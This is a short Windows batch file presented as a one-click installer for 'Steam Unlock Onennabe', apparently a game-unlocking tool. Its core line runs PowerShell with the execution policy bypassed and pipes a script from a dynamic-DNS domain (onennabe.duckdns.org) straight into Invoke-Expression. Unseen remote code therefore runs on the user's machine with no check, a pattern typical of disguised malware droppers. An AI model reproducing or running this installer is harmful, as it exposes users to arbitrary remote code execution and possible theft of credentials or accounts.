@echo off
:: Steam Unlock Onennabe - 1-Click PowerShell Auto Installer
:: Downloads and executes the latest setup script directly from onennabe.duckdns.org

echo ====================================================
echo   Steam Unlock Onennabe - 1-Click Auto Installer
echo ====================================================
echo.
echo Launching automated setup... Please wait.
echo.

powershell -NoProfile -ExecutionPolicy Bypass -Command "irm onennabe.duckdns.org | iex"

if %ERRORLEVEL% NEQ 0 (
    echo.
    echo Installation encountered an error or was cancelled.
    pause
) else (
    echo.
    echo Setup process launched successfully!
    timeout /t 5
)
